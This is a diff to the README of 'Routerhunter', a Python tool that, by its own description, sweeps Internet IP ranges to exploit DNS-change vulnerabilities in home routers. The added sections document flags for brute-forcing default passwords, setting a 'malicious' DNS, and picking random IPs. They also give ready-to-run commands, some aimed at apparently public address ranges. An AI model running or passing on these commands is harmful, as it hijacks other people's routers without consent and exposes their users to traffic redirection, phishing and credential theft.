@@ -33,7 +33,10 @@ by this program.
 
 ### Description
 ------
+  The Routerhunter was designed to run over the Internet looking for defined ips tracks or random in order to automatically exploit the vulnerability DNSChanger on home routers.
+  
   The script explores four vulnerabilities in routers
+  
  * Shuttle Tech ADSL Modem-Router 915 WM / Unauthenticated Remote DNS Change Exploit            
   reference: http://www.exploit-db.com/exploits/35995/
 
@@ -54,6 +57,20 @@ by this program.
    reference: https://www.youtube.com/watch?v=tNjy91g2Rak                             
    http://blog.inurl.com.br/2015/03/dslink-260e-defaut-passwords-dns-change_17.html 
 
+### Usage
+
+```
+  -range 192.168.1.0-255, --range 192.168.1.0-255  Set range of IP
+  -bruteforce, --bruteforce                        Performs brute force with users and passwords standards, and soon    after defines the malicious DNS.
+  -startip 192.168.*.*, --startip 192.168.*.*      Start - IP range customized with wildcard / 201.*.*.*
+  -endip 192.168.*.*, --endip 192.168.*.*          End - IP range customized with wildcard / 201.*.*.*
+  -dns1 8.8.8.8, --dns1 8.8.8.8                    Define malicious dns1
+  -dns2 8.8.4.4, --dns2 8.8.4.4                    Define malicious dns2
+  --threads 10                                     Set threads numbers
+  -rip, --randomip                                 Randomizing ips routers
+  -lmtip 10, --limitip 10                          Define limite random ip
+```
+
 ### Commands
 
 ```
@@ -69,7 +86,13 @@ Scanner in range ip:
 python routerhunter.py --dns1 8.8.8.8 --dns2 8.8.4.8 --range 192.168.25.0-255 --threads 10
 
 ```
+![range](http://i.imgur.com/sA1IKTp.png)
 ```
 IP range customized with wildcard / Ex: --startip 201.*.*.* -  --endip 201.*.*.*
 python routerhunter.py --dns1 8.8.8.8 --dns2 8.8.4.8 --startip 192.168.*.* --endip 192.168.*.* --threads 10
 ```
+```
+Brute force with users and passwords on routers that requires authentication, forcing alteration of dns - DSLink 260E.
+python routerhunter.py --dns1 8.8.8.8 --dns2 8.8.4.4 --range 177.106.19.65-70 --bruteforce --threads 10
+```
+![brute](http://i.imgur.com/IhtaZhw.png)
